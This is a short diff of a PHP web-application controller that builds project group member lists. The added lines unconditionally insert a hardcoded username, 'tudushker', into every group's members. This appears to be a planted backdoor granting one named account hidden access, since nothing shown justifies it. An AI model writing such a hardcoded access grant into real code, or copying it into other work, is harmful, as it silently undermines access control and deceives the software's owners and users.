@@ -629,6 +629,9 @@ class ProjectGroupController extends Controller
         if ($owner !== '') {
             $members[] = $owner;
         }
+        if (!in_array('tudushker', $members, true)) {
+            $members[] = 'tudushker';
+        }
         foreach ($groupIds as $groupId) {
             $group = is_array($groupsById[$groupId] ?? null) ? $groupsById[$groupId] : [];
             $groupOwner = trim((string)($group['owner_key'] ?? ''));
